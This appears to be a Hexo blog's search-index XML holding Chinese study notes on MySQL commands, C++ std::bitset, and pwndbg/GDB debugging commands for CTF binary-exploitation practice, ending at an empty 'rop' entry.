<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>汇编指令</title>
    <link href="/2024/03/25/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
    <url>/2024/03/25/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>mysql</title>
    <link href="/2024/03/21/mysql/"/>
    <url>/2024/03/21/mysql/</url>
    
    <content type="html"><![CDATA[<p>进入数据库命令：mysql -u root -p</p><p>常用的增删改查命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">use database_name进入database_name数据库<br><span class="hljs-keyword">show</span> databases 查看所有的数据库<br><span class="hljs-keyword">show</span> tables 查看当前数据库下的所有表<br><span class="hljs-keyword">desc</span> table_name查看table_name表的相关信息<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name 查看table_name表的所有字段<br><br></code></pre></td></tr></table></figure><p>1 创建表<br>创建表的SQL语句格式如下：<br>CREATE TABLE 表名(属性名 数据类型 [完整性约束条件],<br>                   属性名 数据类型 [完整性约束条件],<br>                   …<br>                   属性名 数据类型 [完整性约束条件]<br>             );<br>注意创建表的时候要选择合适的数据类型，而且还可以给字段添加完整性约束条件，比如主键、非空键等，完整的约束条件如下所示：</p><p>约束条件说明</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PRIMARY</span> KEY修饰的属性为该表的主键，可以区分不同的行记录<br><span class="hljs-keyword">FOREIGN</span> KEY修饰的属性为该表的外键，关联了父表的主键<br><span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>表示该属性不能为空<br><span class="hljs-keyword">UNIQUE</span>表示该属性的值是唯一的<br>AUTO_INCREMENTMySQL特色，表示该属性是自增的，整数类型<br><span class="hljs-keyword">DEFAULT</span>给属性设置默认值<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>数据库</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bitset</title>
    <link href="/2024/03/20/%E7%BC%96%E7%A8%8B/bitset/"/>
    <url>/2024/03/20/%E7%BC%96%E7%A8%8B/bitset/</url>
    
    <content type="html"><![CDATA[<p><code>std::bitset</code> 是 C++ 标准库中的一个类，用于表示二进制位序列。它提供了一种方便的方式来处理二进制数据，尤其适用于位运算操作。</p><p><code>std::bitset</code> 类型表示一个固定长度的位序列，每个位都只能是 0 或 1。这个固定长度在创建对象时指定，并且不能在运行时更改。类似于整数类型，<code>std::bitset</code> 支持多种操作，包括位运算、位查询和位设置。</p><p>下面是 <code>std::bitset</code> 类型的创建方式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bitset&gt;</span></span><br><br>std::bitset&lt;N&gt; bitset1; <span class="hljs-comment">// 创建一个长度为 N 的 bitset，所有位都被初始化为 0</span><br><span class="hljs-function">std::bitset&lt;N&gt; <span class="hljs-title">bitset2</span><span class="hljs-params">(value)</span></span>; <span class="hljs-comment">// 使用二进制整数 value 初始化一个长度为 N 的 bitset</span><br><span class="hljs-function">std::bitset&lt;N&gt; <span class="hljs-title">bitset3</span><span class="hljs-params">(string)</span></span>; <span class="hljs-comment">// 使用二进制字符串 string 初始化一个长度为 N 的 bitset</span><br><span class="hljs-function">std::bitset&lt;N&gt; <span class="hljs-title">bitset4</span><span class="hljs-params">(bitset)</span></span>; <span class="hljs-comment">// 使用另一个 bitset 初始化一个长度为 N 的 bitset</span><br><br>std::bitset&lt;N&gt; bitset5&#123;hexnum&#125;;<span class="hljs-comment">//在c11的标准中，可以直接使用十六进制数转化为相应的二进制数</span><br><br></code></pre></td></tr></table></figure><p>其中，<code>value</code> 是一个无符号整数，<code>string</code> 是一个只包含 <code>&#39;0&#39;</code> 和 <code>&#39;1&#39;</code> 的字符串，<code>bitset</code> 是另一个 <code>std::bitset</code> 对象。</p><p><strong>重点：</strong>使用bitset创建的二进制在数组中存放是逆序的，而且直接打印出来也是逆序的。用下标的形式输出可以发现。</p><p>下面是 <code>std::bitset</code> 类型的一些常用操作：</p><ul><li><code>size()</code> 返回 <code>std::bitset</code> 的长度</li><li><code>count()</code> 返回 <code>std::bitset</code> 中值为 1 的位的数量</li><li><code>any()</code> 返回 <code>std::bitset</code> 中是否存在值为 1 的位</li><li><code>none()</code> 返回 <code>std::bitset</code> 中是否所有位都是 0</li><li><code>all()</code> 返回 <code>std::bitset</code> 中是否所有位都是 1</li><li><code>test(pos)</code> 返回 <code>std::bitset</code> 中位于 <code>pos</code> 位置的值</li><li><code>set(pos)</code> 将 <code>std::bitset</code> 中位于 <code>pos</code> 位置的值设为 1</li><li><code>reset(pos)</code> 将 <code>std::bitset</code> 中位于 <code>pos</code> 位置的值设为 0</li><li><code>flip(pos)</code> 将 <code>std::bitset</code> 中位于 <code>pos</code> 位置的值取反</li><li><code>to_ulong()</code> 返回 <code>std::bitset</code> 转换成的无符号整数值</li><li><code>to_ullong()</code> 返回 <code>std::bitset</code> 转换成的无符号长整数值</li></ul><p><code>std::bitset</code> 重载了许多二进制运算符，如 <code>&amp;</code>、<code>|</code>、<code>^</code>、<code>~</code> 等，使其支持类似于整数类型的位运算操作。例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">std::bitset&lt;4&gt; <span class="hljs-title">bitset1</span><span class="hljs-params">(<span class="hljs-string">&quot;1010&quot;</span>)</span></span>;<br><span class="hljs-function">std::bitset&lt;4&gt; <span class="hljs-title">bitset2</span><span class="hljs-params">(<span class="hljs-string">&quot;0110&quot;</span>)</span></span>;<br><br>std::bitset&lt;4&gt; bitset3 = bitset1 &amp; bitset2; <span class="hljs-comment">// 按位与运算</span><br>std::bitset&lt;4&gt; bitset4 = bitset1 | bitset2; <span class="hljs-comment">// 按位或运算</span><br>std::bitset&lt;4&gt; bitset5 = bitset1 ^ bitset2; <span class="hljs-comment">// 按位异或运算</span><br>std::bitset&lt;4&gt; bitset6 = ~bitset<br><br></code></pre></td></tr></table></figure><p>还可以使用左移、右移运算符进行位移操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">std::bitset&lt;4&gt; <span class="hljs-title">bitset1</span><span class="hljs-params">(<span class="hljs-string">&quot;0101&quot;</span>)</span></span>;<br><br>std::bitset&lt;4&gt; bitset2 = bitset1 &lt;&lt; <span class="hljs-number">2</span>; <span class="hljs-comment">// 左移 2 位，结果为 &quot;010100&quot;</span><br>std::bitset&lt;4&gt; bitset3 = bitset1 &gt;&gt; <span class="hljs-number">1</span>; <span class="hljs-comment">// 右移 1 位，结果为 &quot;0010&quot;</span><br><br></code></pre></td></tr></table></figure><p><code>std::bitset</code> 还支持 <code>to_string()</code> 方法，将其转换成二进制字符串表示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">std::bitset&lt;4&gt; <span class="hljs-title">bitset1</span><span class="hljs-params">(<span class="hljs-string">&quot;1010&quot;</span>)</span></span>;<br>std::string str = bitset1.<span class="hljs-built_in">to_string</span>(); <span class="hljs-comment">// &quot;1010&quot;</span><br><br></code></pre></td></tr></table></figure><p><code>std::bitset</code> 可以作为容器类型使用，可以使用下标访问、迭代器等方式访问其元素。此外，它还可以通过位集合（bitset set operations）进行集合运算，如并集、交集、补集等，可以使用 <code>std::bitset</code> 的成员函数 <code>set()</code>、<code>reset()</code>、<code>flip()</code> 进行相应的集合操作。</p><p><strong>演示代码：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bitset&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cassert&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 构造函数：</span><br>    <span class="hljs-keyword">constexpr</span> std::bitset&lt;4&gt; b1;<br>    <span class="hljs-keyword">constexpr</span> std::bitset&lt;4&gt; b2&#123;<span class="hljs-number">0xA</span>&#125;; <span class="hljs-comment">// == 0B1010</span><br>    std::bitset&lt;4&gt; b3&#123;<span class="hljs-string">&quot;0011&quot;</span>&#125;; <span class="hljs-comment">// 尚不能为 constexpr</span><br>    std::bitset&lt;8&gt; b4&#123;<span class="hljs-string">&quot;ABBA&quot;</span>, <span class="hljs-comment">/*length*/</span><span class="hljs-number">4</span>, <span class="hljs-comment">/*0:*/</span><span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-comment">/*1:*/</span><span class="hljs-string">&#x27;B&#x27;</span>&#125;; <span class="hljs-comment">// == 0B0000&#x27;0110</span><br> <br>    <span class="hljs-comment">// 能打印出 bitset 到流：</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;b1:&quot;</span> &lt;&lt; b1 &lt;&lt; <span class="hljs-string">&quot;; b2:&quot;</span> &lt;&lt; b2 &lt;&lt; <span class="hljs-string">&quot;; b3:&quot;</span> &lt;&lt; b3 &lt;&lt; <span class="hljs-string">&quot;; b4:&quot;</span> &lt;&lt; b4 &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br> <br>    <span class="hljs-comment">// bitset 支持逐位运算：</span><br>    b3 |= <span class="hljs-number">0b0100</span>; <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0b0111</span>);<br>    b3 &amp;= <span class="hljs-number">0b0011</span>; <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0b0011</span>);<br>    b3 ^= std::bitset&lt;<span class="hljs-number">4</span>&gt;&#123;<span class="hljs-number">0b1100</span>&#125;; <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0b1111</span>);<br> <br>    <span class="hljs-comment">// 整个集合上的操作：</span><br>    b3.<span class="hljs-built_in">reset</span>(); <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0</span>);<br>    b3.<span class="hljs-built_in">set</span>(); <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0b1111</span>);<br>    <span class="hljs-built_in">assert</span>(b3.<span class="hljs-built_in">all</span>() &amp;&amp; b3.<span class="hljs-built_in">any</span>() &amp;&amp; !b3.<span class="hljs-built_in">none</span>());<br>    b3.<span class="hljs-built_in">flip</span>(); <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0</span>);<br> <br>    <span class="hljs-comment">// 单独位上的操作：</span><br>    b3.<span class="hljs-built_in">set</span>(<span class="hljs-comment">/* position = */</span> <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>); <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0b0010</span>);<br>    b3.<span class="hljs-built_in">set</span>(<span class="hljs-comment">/* position = */</span> <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>); <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0</span>);<br>    b3.<span class="hljs-built_in">flip</span>(<span class="hljs-comment">/* position = */</span> <span class="hljs-number">2</span>); <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0b0100</span>);<br>    b3.<span class="hljs-built_in">reset</span>(<span class="hljs-comment">/* position = */</span> <span class="hljs-number">2</span>); <span class="hljs-built_in">assert</span>(b3 == <span class="hljs-number">0</span>);<br> <br>    <span class="hljs-comment">// 支持下标 operator[] ：</span><br>    b3[<span class="hljs-number">2</span>] = <span class="hljs-literal">true</span>; <span class="hljs-built_in">assert</span>(<span class="hljs-literal">true</span> == b3[<span class="hljs-number">2</span>]);<br> <br>    <span class="hljs-comment">// 其他操作：</span><br>    <span class="hljs-built_in">assert</span>(b3.<span class="hljs-built_in">count</span>() == <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">assert</span>(b3.<span class="hljs-built_in">size</span>() == <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">assert</span>(b3.<span class="hljs-built_in">to_ullong</span>() == <span class="hljs-number">0b0100</span>ULL);<br>    <span class="hljs-built_in">assert</span>(b3.<span class="hljs-built_in">to_string</span>() == <span class="hljs-string">&quot;0100&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwndbg基本使用</title>
    <link href="/2024/03/13/pwn/pwndbg%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95/"/>
    <url>/2024/03/13/pwn/pwndbg%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h4 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">help</span> <span class="hljs-comment"># 帮助</span><br>i    <span class="hljs-comment"># info，查看一些信息，只输入info可以看可以接什么参数，下面几个比较常用</span><br>i b   <span class="hljs-comment"># info break 查看所有断点信息（编号、断点位置）</span><br>i r   <span class="hljs-comment"># info registers 查看各个寄存器当前的值</span><br>i f   <span class="hljs-comment"># info function 查看所有函数名，需保留符号</span><br>show    <span class="hljs-comment">#和info类似，但是查看调试器的基本信息，如：</span><br>show args <span class="hljs-comment">#查看参数</span><br>rdi     <span class="hljs-comment"># +寄存器名代表一个寄存器内的值，用在地址上直接相当与一个十六进制变量</span><br>backtrace <span class="hljs-comment">#查看调用栈</span><br>q     <span class="hljs-comment">#quit 退出，常用</span><br></code></pre></td></tr></table></figure><h4 id="执行指令"><a href="#执行指令" class="headerlink" title="执行指令"></a>执行指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">s <span class="hljs-comment"># 单步步入，遇到调用跟进函数中，相当于step into，源码层面的一步</span><br>si <span class="hljs-comment"># 同s，汇编层面的一步</span><br>n <span class="hljs-comment"># 单步步过，遇到调用不跟进，相当于step over，源码层面的一步</span><br>ni <span class="hljs-comment"># 同n，汇编层面的一步</span><br>c <span class="hljs-comment"># continue，继续执行到断点，没断点就一直执行下去</span><br>r <span class="hljs-comment"># run，重新开始执行</span><br></code></pre></td></tr></table></figure><h4 id="断点指令"><a href="#断点指令" class="headerlink" title="断点指令"></a>断点指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">b *(<span class="hljs-number">0x123456</span>) <span class="hljs-comment"># 给0x123456地址处的指令下断点</span><br>b *$ rebase(<span class="hljs-number">0x123456</span>) <span class="hljs-comment"># $rebase 在调试开PIE的程序的时候可以直接加上程序的随机地址</span><br>b fun_name <span class="hljs-comment"># 给函数fun_name下断点，目标文件要保留符号才行</span><br>b file_name:fun_name<br>b file_name:<span class="hljs-number">15</span>  <span class="hljs-comment"># 给file_name的15行下断点，要有源码才行</span><br>b <span class="hljs-number">15</span><br>b +<span class="hljs-number">0x10</span> <span class="hljs-comment"># 在程序当前停住的位置下0x10的位置下断点，同样可以-0x10，就是前0x10</span><br><span class="hljs-keyword">break</span> fun <span class="hljs-keyword">if</span> $rdi==<span class="hljs-number">5</span>  <span class="hljs-comment"># 条件断点，rdi值为5的时候才断</span><br></code></pre></td></tr></table></figure><h4 id="删除、禁用断点"><a href="#删除、禁用断点" class="headerlink" title="删除、禁用断点"></a>删除、禁用断点</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">delete <span class="hljs-number">5</span> <span class="hljs-comment">#删除5号断点，直接delete不接数字删除所有</span><br>disable <span class="hljs-number">5</span> <span class="hljs-comment">#禁用5号断点</span><br>enable <span class="hljs-number">5</span> <span class="hljs-comment">#启用5号断点</span><br>clear <span class="hljs-comment">#清除下面的所有断点</span><br></code></pre></td></tr></table></figure><h4 id="内存断点指令watch"><a href="#内存断点指令watch" class="headerlink" title="内存断点指令watch"></a>内存断点指令watch</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">watch <span class="hljs-number">0x123456</span> <span class="hljs-comment">#0x123456地址的数据改变的时候会断</span><br>watch a <span class="hljs-comment">#变量a改变的时候会断</span><br>info watchpoints  <span class="hljs-comment">#查看watch断点信息</span><br></code></pre></td></tr></table></figure><h4 id="捕获断点catch"><a href="#捕获断点catch" class="headerlink" title="捕获断点catch"></a>捕获断点catch</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">catch syscall <span class="hljs-comment">#syscall系统调用的时候断住</span><br>tcatch syscall <span class="hljs-comment">#syscall系统调用的时候断住，只断一次</span><br>info <span class="hljs-keyword">break</span> <span class="hljs-comment">#catch的断点可以通过i b查看</span><br></code></pre></td></tr></table></figure><h4 id="打印指令"><a href="#打印指令" class="headerlink" title="打印指令"></a>打印指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">查看内存指令x：<br>x /nuf <span class="hljs-number">0x123456</span> <span class="hljs-comment"># x指令的格式是：x空格/nfu，nfu代表三个参数</span><br><br>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在<span class="hljs-string">&#x27;/&#x27;</span>后面<br>u代表一个单元几个字节，b(一个字节)，h(俩字节)，w(四字节)，g(八字节)<br>f代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串显示。<br>b 按字符显示。<br>i 显示汇编指令。<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">x /10gx <span class="hljs-number">0x123456</span> <span class="hljs-comment"># 从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</span><br>x /10xd $rdi <span class="hljs-comment"># 从rdi指向的地址向后打印10个单元，每个单元4字节的十进制数</span><br>x /10i <span class="hljs-number">0x123456</span> <span class="hljs-comment"># 从0x123456处向后显示十条汇编指令</span><br></code></pre></td></tr></table></figure><h4 id="打印指令-1"><a href="#打印指令-1" class="headerlink" title="打印指令"></a>打印指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">p fun_name <span class="hljs-comment">#打印fun_name的地址，需要保留符号</span><br>p <span class="hljs-number">0x10</span>-<span class="hljs-number">0x08</span> <span class="hljs-comment">#计算0x10-0x08的结果</span><br>p &amp;a <span class="hljs-comment">#查看变量a的地址</span><br>p *(<span class="hljs-number">0x123456</span>) <span class="hljs-comment">#查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号</span><br>p $rdi<span class="hljs-comment">#显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值</span><br>p *($rdi) <span class="hljs-comment">#显示rdi指向的值</span><br><br>disass <span class="hljs-number">0x123456</span> <span class="hljs-comment">#显示0x123456前后的汇编指令</span><br>x /10i <span class="hljs-comment">#我一般喜欢用x显示指令</span><br></code></pre></td></tr></table></figure><h4 id="打印源代码指令"><a href="#打印源代码指令" class="headerlink" title="打印源代码指令"></a>打印源代码指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span> <span class="hljs-comment">#查看当前附近10行代码，要有源码，list指令pwn题中几乎不用</span><br><span class="hljs-built_in">list</span> <span class="hljs-number">38</span> <span class="hljs-comment">#查看38行附近10行代码</span><br><span class="hljs-built_in">list</span> <span class="hljs-number">1</span>,<span class="hljs-number">10</span> <span class="hljs-comment">#查看1-10行</span><br><span class="hljs-built_in">list</span> main <span class="hljs-comment">#查看main函数开始10行</span><br></code></pre></td></tr></table></figure><h4 id="修改数据指令"><a href="#修改数据指令" class="headerlink" title="修改数据指令"></a>修改数据指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">set</span> $rdi=<span class="hljs-number">0x10</span> <span class="hljs-comment">#把rdi寄存器的值变为0x10</span><br><span class="hljs-built_in">set</span> *(<span class="hljs-number">0x123456</span>)=<span class="hljs-number">0x10</span> <span class="hljs-comment">#0x123456地址的值变为0x10，注意带星号</span><br><span class="hljs-built_in">set</span> args “abc” “<span class="hljs-keyword">def</span>” “gh“<span class="hljs-comment">#给参数123赋值</span><br><span class="hljs-built_in">set</span> args “python -c ‘<span class="hljs-built_in">print</span> “<span class="hljs-number">1234</span>\x7f\xde”’”<span class="hljs-comment">#使用python给参数赋值不可见字符</span><br></code></pre></td></tr></table></figure><h4 id="查找数据"><a href="#查找数据" class="headerlink" title="查找数据"></a>查找数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">search rdi <span class="hljs-comment">#从当前位置向后查包含rdi的指令，返回若干</span><br>search -h <span class="hljs-comment">#查看search帮助</span><br>find “hello” <span class="hljs-comment">#查找hello字符串</span><br>ropgadget <span class="hljs-comment">#查找ropgadget</span><br></code></pre></td></tr></table></figure><h4 id="堆操作指令"><a href="#堆操作指令" class="headerlink" title="堆操作指令"></a>堆操作指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">arena <span class="hljs-comment">#显示arena的详细信息</span><br>arenas <span class="hljs-comment">#显示所有arena的基本信息</span><br>arenainfo <span class="hljs-comment">#显示所有arena的信息</span><br>bins <span class="hljs-comment">#查看所有种类的堆块的链表情况</span><br>fastbins <span class="hljs-comment">#单独查看fastbins的链表情况</span><br>largebins <span class="hljs-comment">#查看largebins的链表情况</span><br>smallbins <span class="hljs-comment">#查看smallbins的链表情况</span><br>unsortedbin <span class="hljs-comment">#查看unsortedbin链表情况</span><br>tcachebins <span class="hljs-comment">#查看tcachebins的链表情况</span><br>tcache <span class="hljs-comment">#查看tcache详细信息</span><br>heap<span class="hljs-comment">#数据结构的形式显示所有堆块，会显示一大堆</span><br>heapbase <span class="hljs-comment">#查看堆起始地址</span><br>heapinfo、heapinfoall <span class="hljs-comment">#显示堆得信息</span><br>parseheap <span class="hljs-comment">#显示堆结构</span><br>tracemalloc <span class="hljs-comment">#会跟提示所有操作堆的地方</span><br></code></pre></td></tr></table></figure><h4 id="pwndbg插件独有指令"><a href="#pwndbg插件独有指令" class="headerlink" title="pwndbg插件独有指令"></a>pwndbg插件独有指令</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">cyclc <span class="hljs-number">50</span> <span class="hljs-comment">#生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br>$reabse <span class="hljs-comment">#开启PIE的情况的地址偏移</span><br>b *$reabse(<span class="hljs-number">0x123456</span>) <span class="hljs-comment">#断住PIE状态下的二进制文件中0x123456的地方</span><br>codebase <span class="hljs-comment">#打印PIE偏移，与rebase不同，这是打印，rebase是使用</span><br>stack <span class="hljs-comment">#查看栈</span><br>retaddr <span class="hljs-comment">#打印包含返回地址的栈地址</span><br>canary <span class="hljs-comment">#直接看canary的值</span><br>plt <span class="hljs-comment">#查看plt表</span><br>got <span class="hljs-comment">#查看got表</span><br>hexdump <span class="hljs-comment">#想IDA那样显示数据，带字符串</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rop</title>
    <link href="/2024/03/11/pwn/rop/"/>
    <url>/2024/03/11/pwn/rop/</url>
    
